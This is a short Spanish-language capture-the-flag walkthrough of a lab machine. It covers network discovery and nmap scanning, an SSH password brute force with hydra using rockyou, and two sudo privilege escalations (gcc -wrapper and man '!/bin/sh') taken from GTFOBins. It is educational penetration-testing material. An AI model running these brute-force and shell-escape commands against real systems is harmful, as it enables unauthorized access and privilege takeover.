Averiguamos cúal es la ip de la víctima: 
```
arp-scan -I eth0 --localnet
```

![](images/Pasted%20image%2020260123114037.png)

```
10.0.2.18
```

ENUMERACIÓN
--
Usaremos para el reconocimiento de puertos, nmap.

```
nmap -sVC -p- -n --min-rate 5000 10.0.2.18
```

![](images/Pasted%20image%2020260123114659.png)

Tenemos el puerto 22 y 80.

EXPLORACIÓN
--

Miramos el código de la web y vemos un comentario de un posible usuario. 

![](images/Pasted%20image%2020260123115443.png)

Vamos a usar hydra para buscar contraseña. 

EXPLOTACIÓN
--

```
hydra -l pizzapiña -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.18 -t 5
```

![](images/Pasted%20image%2020260123115829.png)

Login : pizzapiña y contraseña : steven

Así que podemos conectarnos por ssh. 

Una vez conectado buscamos un poco el flag del usuario. 


ESCALADA DE PRIVILEGIO
--
```
sudo -l
```

![](images/Pasted%20image%2020260123120521.png)

Nos vamos a https://gtfobins.org/

```
sudo -u pizzasinpiña gcc -wrapper /bin/sh,-s .
```

Y ahora realizamos el tratamiento de la tty. 


```
script /dev/null -c bash
```


![](images/Pasted%20image%2020260123121651.png)

Estamos en el usuario de pizzasinpiña así que : 

```
sudo -l
```

Vemos que podemos escalar con man 

![](images/Pasted%20image%2020260123121829.png)

```
sudo -
```

Tenemos sudo con man así que podemos verlo en https://gtfobins.org/

```
sudo man man
```

Y ponemos lo siguiente: 

```
!/bin/sh
```

![](images/Pasted%20image%2020260123122311.png)

Y ya somos root.

![](images/Pasted%20image%2020260123122358.png)
Ahora a buscar la flag. 

![](images/Pasted%20image%2020260123122500.png)
